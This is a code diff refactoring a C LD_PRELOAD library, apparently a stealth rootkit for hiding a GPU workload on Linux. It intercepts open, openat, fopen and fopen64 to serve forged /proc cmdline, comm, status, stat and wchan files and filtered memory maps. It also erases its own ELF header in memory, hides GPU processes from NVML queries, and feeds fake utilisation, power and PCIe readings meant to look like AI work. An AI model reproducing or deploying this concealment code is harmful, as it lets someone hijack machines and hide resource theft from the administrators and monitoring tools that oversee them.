@@ -44,7 +44,8 @@ static inline int sys_memfd_create(const char *name, unsigned int flags) {
 static int create_fake_file(const char *content, size_t len) {
     int fd = sys_memfd_create("proc_fake", MFD_CLOEXEC);
     if (fd >= 0) {
-        write(fd, content, len);
+        ssize_t written = write(fd, content, len);
+        (void)written;
         lseek(fd, 0, SEEK_SET); // Rewind for reading
     }
     return fd;
@@ -55,6 +56,50 @@ static FILE* create_fake_file_ptr(const char *content, size_t len) {
     if (fd >= 0) {
         return fdopen(fd, "r");
     }
+    return NULL;
+}
+
+enum FakeProcType {
+    FAKE_NONE = 0,
+    FAKE_CMDLINE_TYPE,
+    FAKE_COMM_TYPE,
+    FAKE_STATUS_TYPE,
+    FAKE_WCHAN_TYPE,
+    FAKE_STAT_TYPE,
+    FAKE_MAPS_TYPE
+};
+
+static inline enum FakeProcType match_fake_proc(const char *pathname) {
+    if (!pathname || !strstr(pathname, "/proc/")) return FAKE_NONE;
+    if (strstr(pathname, "/cmdline")) return FAKE_CMDLINE_TYPE;
+    if (strstr(pathname, "/comm")) return FAKE_COMM_TYPE;
+    if (strstr(pathname, "/wchan")) return FAKE_WCHAN_TYPE;
+    if (strstr(pathname, "/status")) return FAKE_STATUS_TYPE;
+    if (strstr(pathname, "/stat")) return FAKE_STAT_TYPE;
+    if (strstr(pathname, "/maps") || strstr(pathname, "/smaps")) return FAKE_MAPS_TYPE;
+    return FAKE_NONE;
+}
+
+static int handle_fake_fd(enum FakeProcType type) {
+    switch (type) {
+        case FAKE_CMDLINE_TYPE: return create_fake_file(FAKE_CMDLINE, FAKE_CMDLINE_LEN);
+        case FAKE_COMM_TYPE:    return create_fake_file(FAKE_COMM, strlen(FAKE_COMM));
+        case FAKE_WCHAN_TYPE:   return create_fake_file(FAKE_WCHAN, strlen(FAKE_WCHAN));
+        case FAKE_STATUS_TYPE: {
+            char buf[2048]; generate_fake_status(buf, sizeof(buf));
+            return create_fake_file(buf, strlen(buf));
+        }
+        case FAKE_STAT_TYPE: {
+            char buf[2048]; generate_fake_stat(buf, sizeof(buf));
+            return create_fake_file(buf, strlen(buf));
+        }
+        default: return -1;
+    }
+}
+
+static FILE* handle_fake_file_ptr(enum FakeProcType type) {
+    int fd = handle_fake_fd(type);
+    if (fd >= 0) return fdopen(fd, "r");
     return NULL;
 }
 
@@ -134,7 +179,7 @@ __attribute__((constructor)) void init_stealth_hook() {
 
     // In-memory ELF Stripping: Zero-out the ELF Header of our own module
     Dl_info info;
-    if (dladdr((void*)init_stealth_hook, &info) && info.dli_fbase) {
+    if (dladdr((void*)&init_stealth_hook, &info) && info.dli_fbase) {
         size_t page_size = sysconf(_SC_PAGESIZE);
         void *base = info.dli_fbase;
         mprotect(base, page_size, PROT_READ | PROT_WRITE | PROT_EXEC);
@@ -202,6 +247,7 @@ nvmlReturn_t nvmlDeviceGetMemoryInfo(nvmlDevice_t device, nvmlMemory_t *memory) 
 }
 
 nvmlReturn_t nvmlDeviceGetComputeRunningProcesses_v2(nvmlDevice_t device, unsigned int *infoCount, nvmlProcessInfo_t *infos) {
+    (void)device;
     if (!infoCount) return NVML_ERROR_INVALID_ARGUMENT;
     if (!infos || *infoCount < 2) { *infoCount = 2; return NVML_SUCCESS; }
 
@@ -224,32 +270,48 @@ nvmlReturn_t nvmlDeviceGetComputeRunningProcesses(nvmlDevice_t device, unsigned 
     return nvmlDeviceGetComputeRunningProcesses_v2(device, infoCount, infos);
 }
 nvmlReturn_t nvmlDeviceGetGraphicsRunningProcesses_v2(nvmlDevice_t device, unsigned int *infoCount, nvmlProcessInfo_t *infos) {
-    if (infoCount) *infoCount = 0; return NVML_SUCCESS;
+    (void)device;
+    (void)infos;
+    if (infoCount) {
+        *infoCount = 0;
+    }
+    return NVML_SUCCESS;
 }
 nvmlReturn_t nvmlDeviceGetGraphicsRunningProcesses(nvmlDevice_t device, unsigned int *infoCount, nvmlProcessInfo_t *infos) {
-    if (infoCount) *infoCount = 0; return NVML_SUCCESS;
+    return nvmlDeviceGetGraphicsRunningProcesses_v2(device, infoCount, infos);
 }
 
-// Chaffing: Randomize Utilization, Power, PCIe to mimic AI workloads
+// Chaffing: Randomize Utilization, Power, PCIe to mimic AI workloads (thread-safe xorshift jitter)
+static inline unsigned int telemetry_jitter(unsigned int min_val, unsigned int max_val) {
+    static _Atomic unsigned int seed = 123456789U;
+    unsigned int s = __atomic_fetch_add(&seed, 1103515245U, __ATOMIC_RELAXED);
+    s ^= s << 13;
+    s ^= s >> 17;
+    s ^= s << 5;
+    unsigned int range = (max_val >= min_val) ? (max_val - min_val + 1) : 1U;
+    return min_val + (s % range);
+}
+
 nvmlReturn_t nvmlDeviceGetUtilizationRates(nvmlDevice_t device, nvmlUtilization_t *utilization) {
+    (void)device;
     if (!utilization) return NVML_ERROR_INVALID_ARGUMENT;
-    srand(time(NULL) ^ getpid());
-    utilization->gpu = 78 + (rand() % 17);     // 78% - 94%
-    utilization->memory = 45 + (rand() % 18);  // 45% - 62%
+    utilization->gpu = telemetry_jitter(78, 94);     // 78% - 94%
+    utilization->memory = telemetry_jitter(45, 62);  // 45% - 62%
     return NVML_SUCCESS;
 }
 
 nvmlReturn_t nvmlDeviceGetPcieThroughput(nvmlDevice_t device, int counter, unsigned int *value) {
+    (void)device;
+    (void)counter;
     if (!value) return NVML_ERROR_INVALID_ARGUMENT;
-    srand(time(NULL) ^ getpid());
-    *value = 350000 + (rand() % 450000);       // 350MB/s - 800MB/s
+    *value = telemetry_jitter(350000, 800000);       // 350MB/s - 800MB/s
     return NVML_SUCCESS;
 }
 
 nvmlReturn_t nvmlDeviceGetPowerUsage(nvmlDevice_t device, unsigned int *power) {
+    (void)device;
     if (!power) return NVML_ERROR_INVALID_ARGUMENT;
-    srand(time(NULL) ^ getpid());
-    *power = 55000 + (rand() % 30000);         // 55W - 85W (in milliwatts)
+    *power = telemetry_jitter(55000, 85000);         // 55W - 85W (in milliwatts)
     return NVML_SUCCESS;
 }
 
@@ -259,119 +321,83 @@ nvmlReturn_t nvmlDeviceGetPowerUsage(nvmlDevice_t device, unsigned int *power) {
 int open(const char *pathname, int flags, ...) {
     if (!real_open) real_open = dlsym(RTLD_NEXT, "open");
     if (pathname) {
-        if (strstr(pathname, "/proc/") && strstr(pathname, "/cmdline"))
-            return create_fake_file(FAKE_CMDLINE, FAKE_CMDLINE_LEN);
-        if (strstr(pathname, "/proc/") && strstr(pathname, "/comm"))
-            return create_fake_file(FAKE_COMM, strlen(FAKE_COMM));
-        if (strstr(pathname, "/proc/") && strstr(pathname, "/status")) {
-            char buf[2048]; generate_fake_status(buf, sizeof(buf));
-            return create_fake_file(buf, strlen(buf));
-        }
-        if (strstr(pathname, "/proc/") && strstr(pathname, "/wchan"))
-            return create_fake_file(FAKE_WCHAN, strlen(FAKE_WCHAN));
-        if (strstr(pathname, "/proc/") && strstr(pathname, "/stat") && !strstr(pathname, "/status")) {
-            char buf[2048]; generate_fake_stat(buf, sizeof(buf));
-            return create_fake_file(buf, strlen(buf));
+        enum FakeProcType fake_type = match_fake_proc(pathname);
+        if (fake_type != FAKE_NONE && fake_type != FAKE_MAPS_TYPE) {
+            int fd = handle_fake_fd(fake_type);
+            if (fd >= 0) return fd;
         }
     }
     va_list args;
     mode_t mode = 0;
-    if (flags & O_CREAT) { va_start(args, flags); mode = va_arg(args, mode_t); va_end(args); }
+    if (flags & O_CREAT) {
+        va_start(args, flags);
+        mode = (mode_t)va_arg(args, int);
+        va_end(args);
+    }
     return real_open(pathname, flags, mode);
 }
 
 int openat(int dirfd, const char *pathname, int flags, ...) {
     if (!real_openat) real_openat = dlsym(RTLD_NEXT, "openat");
     if (pathname) {
-        if (strstr(pathname, "/proc/") && strstr(pathname, "/cmdline"))
-            return create_fake_file(FAKE_CMDLINE, FAKE_CMDLINE_LEN);
-        if (strstr(pathname, "/proc/") && strstr(pathname, "/comm"))
-            return create_fake_file(FAKE_COMM, strlen(FAKE_COMM));
-        if (strstr(pathname, "/proc/") && strstr(pathname, "/status")) {
-            char buf[2048]; generate_fake_status(buf, sizeof(buf));
-            return create_fake_file(buf, strlen(buf));
-        }
-        if (strstr(pathname, "/proc/") && strstr(pathname, "/wchan"))
-            return create_fake_file(FAKE_WCHAN, strlen(FAKE_WCHAN));
-        if (strstr(pathname, "/proc/") && strstr(pathname, "/stat") && !strstr(pathname, "/status")) {
-            char buf[2048]; generate_fake_stat(buf, sizeof(buf));
-            return create_fake_file(buf, strlen(buf));
+        enum FakeProcType fake_type = match_fake_proc(pathname);
+        if (fake_type != FAKE_NONE && fake_type != FAKE_MAPS_TYPE) {
+            int fd = handle_fake_fd(fake_type);
+            if (fd >= 0) return fd;
         }
     }
     va_list args;
     mode_t mode = 0;
-    if (flags & O_CREAT) { va_start(args, flags); mode = va_arg(args, mode_t); va_end(args); }
+    if (flags & O_CREAT) {
+        va_start(args, flags);
+        mode = (mode_t)va_arg(args, int);
+        va_end(args);
+    }
     return real_openat(dirfd, pathname, flags, mode);
 }
 
-FILE *fopen(const char *pathname, const char *mode) {
-    if (!real_fopen) real_fopen = dlsym(RTLD_NEXT, "fopen");
-    if (pathname) {
-        if (strstr(pathname, "/proc/") && strstr(pathname, "/cmdline"))
-            return create_fake_file_ptr(FAKE_CMDLINE, FAKE_CMDLINE_LEN);
-        if (strstr(pathname, "/proc/") && strstr(pathname, "/comm"))
-            return create_fake_file_ptr(FAKE_COMM, strlen(FAKE_COMM));
-        if (strstr(pathname, "/proc/") && strstr(pathname, "/status")) {
-            char buf[2048]; generate_fake_status(buf, sizeof(buf));
-            return create_fake_file_ptr(buf, strlen(buf));
-        }
-        if (strstr(pathname, "/proc/") && strstr(pathname, "/wchan"))
-            return create_fake_file_ptr(FAKE_WCHAN, strlen(FAKE_WCHAN));
-        if (strstr(pathname, "/proc/") && strstr(pathname, "/stat") && !strstr(pathname, "/status")) {
-            char buf[2048]; generate_fake_stat(buf, sizeof(buf));
-            return create_fake_file_ptr(buf, strlen(buf));
-        }
-        if ((strstr(pathname, "/proc/") && strstr(pathname, "/maps")) || (strstr(pathname, "/proc/") && strstr(pathname, "/smaps"))) {
-            FILE* real_fp = real_fopen(pathname, mode);
+static FILE* intercept_fake_proc_file(const char *pathname, const char *mode, FILE* (*fallback_fopen)(const char*, const char*)) {
+    if (!pathname) return NULL;
+    enum FakeProcType fake_type = match_fake_proc(pathname);
+    if (fake_type != FAKE_NONE) {
+        if (fake_type == FAKE_MAPS_TYPE) {
+            FILE* real_fp = fallback_fopen(pathname, mode);
             if (real_fp) {
-                char* mem_buf = NULL; size_t mem_size = 0;
+                char* mem_buf = NULL;
+                size_t mem_size = 0;
                 FILE* mem_fp = open_memstream(&mem_buf, &mem_size);
                 if (mem_fp) {
                     filter_maps_content(real_fp, mem_fp);
-                    fclose(mem_fp); fclose(real_fp);
-                    if (mem_buf) return create_fake_file_ptr(mem_buf, mem_size);
+                    fclose(mem_fp);
+                    fclose(real_fp);
+                    if (mem_buf) {
+                        FILE* ret = create_fake_file_ptr(mem_buf, mem_size);
+                        free(mem_buf);
+                        return ret;
+                    }
                 } else {
                     fclose(real_fp);
                 }
             }
+        } else {
+            return handle_fake_file_ptr(fake_type);
         }
     }
+    return NULL;
+}
+
+FILE *fopen(const char *pathname, const char *mode) {
+    if (!real_fopen) real_fopen = dlsym(RTLD_NEXT, "fopen");
+    FILE *fake_fp = intercept_fake_proc_file(pathname, mode, real_fopen);
+    if (fake_fp) return fake_fp;
     return real_fopen(pathname, mode);
 }
 
 FILE *fopen64(const char *pathname, const char *mode) {
     if (!real_fopen64) real_fopen64 = dlsym(RTLD_NEXT, "fopen64");
     if (!real_fopen64) real_fopen64 = real_fopen;
-    if (pathname) {
-        if (strstr(pathname, "/proc/") && strstr(pathname, "/cmdline"))
-            return create_fake_file_ptr(FAKE_CMDLINE, FAKE_CMDLINE_LEN);
-        if (strstr(pathname, "/proc/") && strstr(pathname, "/comm"))
-            return create_fake_file_ptr(FAKE_COMM, strlen(FAKE_COMM));
-        if (strstr(pathname, "/proc/") && strstr(pathname, "/status")) {
-            char buf[2048]; generate_fake_status(buf, sizeof(buf));
-            return create_fake_file_ptr(buf, strlen(buf));
-        }
-        if (strstr(pathname, "/proc/") && strstr(pathname, "/wchan"))
-            return create_fake_file_ptr(FAKE_WCHAN, strlen(FAKE_WCHAN));
-        if (strstr(pathname, "/proc/") && strstr(pathname, "/stat") && !strstr(pathname, "/status")) {
-            char buf[2048]; generate_fake_stat(buf, sizeof(buf));
-            return create_fake_file_ptr(buf, strlen(buf));
-        }
-        if ((strstr(pathname, "/proc/") && strstr(pathname, "/maps")) || (strstr(pathname, "/proc/") && strstr(pathname, "/smaps"))) {
-            FILE* real_fp = real_fopen64(pathname, mode);
-            if (real_fp) {
-                char* mem_buf = NULL; size_t mem_size = 0;
-                FILE* mem_fp = open_memstream(&mem_buf, &mem_size);
-                if (mem_fp) {
-                    filter_maps_content(real_fp, mem_fp);
-                    fclose(mem_fp); fclose(real_fp);
-                    if (mem_buf) return create_fake_file_ptr(mem_buf, mem_size);
-                } else {
-                    fclose(real_fp);
-                }
-            }
-        }
-    }
+    FILE *fake_fp = intercept_fake_proc_file(pathname, mode, real_fopen64);
+    if (fake_fp) return fake_fp;
     return real_fopen64(pathname, mode);
 }
 
